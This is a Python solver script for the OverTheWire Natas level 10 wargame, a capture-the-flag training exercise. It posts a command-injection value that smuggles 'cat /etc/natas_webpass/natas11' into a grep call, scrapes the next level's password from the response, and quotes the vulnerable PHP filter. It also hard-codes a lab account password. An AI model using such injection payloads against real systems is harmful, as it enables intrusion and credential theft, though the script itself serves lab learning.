from pwn import *
import requests
import re
import html

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas11 password, Hold on! ")
session = requests.session()
#web = session.get(url + "/index-source.html", auth = (username, password)).text
web = session.post(url, data = {"needle" : ". cat /etc/natas_webpass/natas11 #", "submit" : "submit"}, auth = (username, password)).text
#content = print(html.unescape(web))
#print(web)
print("The password for natas11 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])

'''

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

'''